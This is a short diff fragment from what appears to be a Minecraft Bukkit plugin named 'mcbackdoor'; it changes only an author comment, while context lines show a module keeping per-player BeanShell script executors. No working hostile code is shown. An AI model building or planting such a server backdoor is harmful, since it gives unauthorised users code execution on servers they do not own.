@@ -14,7 +14,7 @@ import org.martin.bukkit.mcbackdoor.utils.BSHExecutor;
 
 /**
  *
- * @author martin
+ * @author Kekec852
  */
 public class BSHModule implements Module{
     private HashMap<Player,BSHExecutor> shells = new HashMap<Player, BSHExecutor>();
